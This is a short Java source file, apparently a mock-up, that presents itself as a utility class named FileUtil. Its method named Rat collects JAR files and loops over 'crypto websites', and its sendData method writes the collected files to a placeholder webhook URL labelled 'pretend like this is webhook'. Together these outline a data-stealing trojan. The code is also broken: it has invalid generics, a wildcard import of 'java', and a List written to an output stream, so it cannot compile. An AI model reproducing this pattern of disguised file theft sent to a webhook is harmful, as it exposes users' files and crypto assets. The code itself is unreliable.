package utils;

import java.*;

public class FileUtil {
  List<T... t> files = new ArrayList<T... t>();
  void Rat() {
    files.add(new JarFile());
    List<T...  g> crypto_websites = new ArrayList<(HttpURLConnection) URL>();
    for (T... g : crypto_websites) {
      HttpURLConnection website = (HttpURLConnection) new URL("Crypto.com").openConnection();
    }
  }
  void sendData() {
    for (T... t : files) {
      HttpURLConnection webhook = (HttpURLConnection) new URL("pretend like this is webhook").openConnection();
      try {
        webhook.getOutputStream().write(Arrays.asList(files));
      }
      catch (Exception e) {
        e.printStackTrace();
      }
    }
  }
}
